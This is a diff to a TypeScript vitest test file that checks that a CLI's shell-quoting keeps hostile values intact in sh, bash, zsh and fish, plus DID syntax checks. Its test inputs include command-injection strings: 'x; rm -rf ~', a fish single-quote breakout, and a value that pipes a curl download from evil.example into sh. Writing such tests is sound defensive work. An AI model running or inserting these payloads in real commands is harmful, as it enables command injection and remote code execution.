@@ -1,4 +1,7 @@
 import { execFileSync } from "node:child_process";
+import { mkdtempSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
 
 import { describe, expect, it } from "vitest";
 
@@ -47,7 +50,7 @@ describe("signed git-ns tasks", () => {
     });
     expect(t.consent).toBe("normal");
     expect(t.command).toBe(
-      `cnm git grant --subject=${BOB} --right=git.commit.sign --resource=github.com/acme/widgets --expires-in=90d --reason='Bob'\\''s first PR'`,
+      `cnm git grant --subject=${BOB} --right=git.commit.sign --resource=github.com/acme/widgets --expires-in=90d --reason='Bob'"'"'s first PR'`,
     );
   });
 
@@ -205,22 +208,16 @@ describe("every command is safe to paste into a shell", () => {
     ],
   ];
 
-  /** What a POSIX shell makes of `cmd`'s arguments, without running `cnm`. */
+  /** What sh makes of `cmd`'s arguments, without running `cnm`. */
   function shellWords(cmd: string): string[] {
-    const args = cmd.replace(/^cnm git /, "");
-    const out = execFileSync("sh", ["-c", `for a in ${args}; do printf '%s\\0' "$a"; done`], {
-      encoding: "utf8",
-      env: { PATH: process.env.PATH ?? "/usr/bin:/bin" },
-    });
-    return out.split("\0").slice(0, -1);
+    return argvIn("sh", cmd.replace(/^cnm git /, ""));
   }
 
   it.each(builders)("%s: the payload reaches cnm as one literal argument", (_, build) => {
-    for (const value of [EVIL, "-rf", "a'b", "$HOME", "x; rm -rf ~", "`id`"]) {
+    for (const value of [EVIL, "-rf", "a'b", "$HOME", "x; rm -rf ~", "`id`", FISH_BREAKOUT]) {
       const words = shellWords(build(value).command);
       // Exactly the value, whole — bare as a positional or bound to its flag.
       expect(words.some((word) => word === value || word.endsWith(`=${value}`))).toBe(true);
-      // Nothing expanded, split or run.
       // Nothing expanded or split: no word is a fragment of the value.
       expect(words.filter((word) => word !== value && value.includes(word) && word.length > 1)).toEqual([]);
     }
@@ -233,13 +230,135 @@ describe("every command is safe to paste into a shell", () => {
   });
 });
 
+// ── the same bytes back in every shell a console user might paste into ──
+
+/** POSIX's `'\''` quoting breaks out here in fish, which reads `\'` and `\\`
+ *  as escapes inside single quotes: pasted into fish it runs `echo INJECTED`. */
+const FISH_BREAKOUT = "x\\' ; echo INJECTED ; echo \\";
+
+const HOSTILE = [
+  FISH_BREAKOUT,
+  "it's",
+  "'",
+  "''",
+  "\\",
+  "\\\\",
+  "\\'",
+  "'\\",
+  "a\\'b\\\\'c",
+  "\\n\\t\\0",
+  "$(echo INJECTED)",
+  "${HOME}",
+  "$HOME",
+  "$fish_pid",
+  "`echo INJECTED`",
+  "(echo INJECTED)",
+  "line one\nline two\n",
+  "\n",
+  "tab\there",
+  "emoji 🦀 and ünïcödé",
+  "-rf",
+  "--help",
+  "-",
+  "=ls",
+  "%self",
+  "~",
+  "~root",
+  "*",
+  "{a,b}",
+  "a;b|c&d>e<f",
+  '"double" quotes',
+  "#not a comment",
+  "",
+  " ",
+  "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)",
+  "github.com/acme/widgets",
+];
+
+const SHELL_HOME = mkdtempSync(join(tmpdir(), "vtc-shellquote-"));
+
+/** The argv `args` (a string of shell words) gives a program in `shell`,
+ *  read back through an external printf so no shell's builtin differs. */
+function argvIn(shell: string, args: string): string[] {
+  const out = execFileSync(shell, ["-c", `env printf '%s\\0' ${args}`], {
+    encoding: "utf8",
+    // A throwaway HOME: no user rc file runs, and fish has somewhere to write.
+    env: { PATH: process.env.PATH ?? "/usr/bin:/bin", HOME: SHELL_HOME },
+    stdio: ["ignore", "pipe", "pipe"],
+  });
+  return out.split("\0").slice(0, -1);
+}
+
+function installed(shell: string): boolean {
+  try {
+    execFileSync(shell, ["-c", "true"], { stdio: "ignore" });
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+describe("shellQuote — exact output", () => {
+  it.each([
+    ["github.com/acme", "github.com/acme"],
+    ["did:webvh:QmBob:bob.dev", "did:webvh:QmBob:bob.dev"],
+    ["two words", "'two words'"],
+    ["", "''"],
+    ["-rf", "'-rf'"],
+    ["=ls", "'=ls'"],
+    ["%self", "'%self'"],
+    ["a=b", "a=b"],
+    ["it's", `'it'"'"'s'`],
+    ["'", `"'"`],
+    ["\\", `"\\\\"`],
+    ["\\'", `"\\\\""'"`],
+    [FISH_BREAKOUT, `'x'"\\\\""'"' ; echo INJECTED ; echo '"\\\\"`],
+    ["$(id)", "'$(id)'"],
+    ["`id`", "'`id`'"],
+    ["a\nb", "'a\nb'"],
+    ["🦀", "'🦀'"],
+  ])("%j → %s", (value, quoted) => {
+    expect(shellQuote(value)).toBe(quoted);
+  });
+});
+
+describe.each(["sh", "bash", "zsh", "fish"])("shellQuote round-trips in %s", (shell) => {
+  const present = installed(shell);
+  // sh and bash are on every CI runner; zsh and fish are checked where present.
+  if (shell === "sh" || shell === "bash") {
+    it(`${shell} is installed`, () => expect(present).toBe(true));
+  }
+
+  it.skipIf(!present)("each hostile value comes back byte-exact, as one argument", () => {
+    const argv = argvIn(shell, HOSTILE.map(shellQuote).join(" "));
+    expect(argv).toEqual(HOSTILE);
+  });
+
+  it.skipIf(!present)("each value survives alone and bound to a flag", () => {
+    for (const value of HOSTILE) {
+      expect(argvIn(shell, shellQuote(value))).toEqual([value]);
+      expect(argvIn(shell, `--reason=${shellQuote(value)}`)).toEqual([`--reason=${value}`]);
+    }
+  }, 60_000);
+
+  it.skipIf(!present)("a whole reseat command reaches cnm intact", () => {
+    const t = reseatTask(FISH_BREAKOUT, "github.com/acme", BOB, FISH_BREAKOUT);
+    expect(argvIn(shell, t.command.replace(/^cnm /, ""))).toEqual([
+      "git",
+      "reseat",
+      FISH_BREAKOUT,
+      `--subject=${BOB}`,
+      `--statement=${FISH_BREAKOUT}`,
+    ]);
+  });
+});
+
 describe("didError — DID Core syntax", () => {
-  it("accepts DIDs, including pct-encoded ids, colon segments and a fragment", () => {
+  it("accepts DIDs, including pct-encoded ids and colon segments", () => {
     for (const did of [
       "did:webvh:QmAlice:alice.dev",
       "did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK",
       "did:web:example.com%3A8443:users:alice",
-      "did:web:example.com#key-1",
     ]) {
       expect(didError(did)).toBeNull();
     }
@@ -255,9 +374,16 @@ describe("didError — DID Core syntax", () => {
       "did:web:x%zz",
       "did:web:x#",
       "did:web:x/path",
+      "did:web:x?service=files",
+      // A DID URL names a key or a service, not a party (DID-core, as the VTC
+      // checks it).
+      "did:web:example.com#key-1",
+      "did:webvh:QmBob:bob.dev#key-0",
+      `did:key:${"a".repeat(1024)}`,
     ]) {
       expect(didError(bad)).not.toBeNull();
     }
+    expect(didError("did:web:example.com#key-1")).toMatch(/fragment/);
   });
 });
 
